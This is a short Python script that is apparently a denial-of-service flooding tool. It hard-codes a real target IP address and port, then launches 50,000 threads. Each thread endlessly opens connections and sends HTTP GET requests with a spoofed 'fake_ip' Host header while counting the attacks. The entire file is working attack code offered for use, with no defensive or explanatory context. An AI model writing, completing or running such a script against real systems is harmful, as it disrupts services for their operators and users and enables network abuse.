import socket
import threading


target = '76.76.21.21'
fake_ip = '96.45.66.104'
port = 8000


attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()
        
for i in range(50000):
    thread = threading.Thread(target=attack)
    thread.start()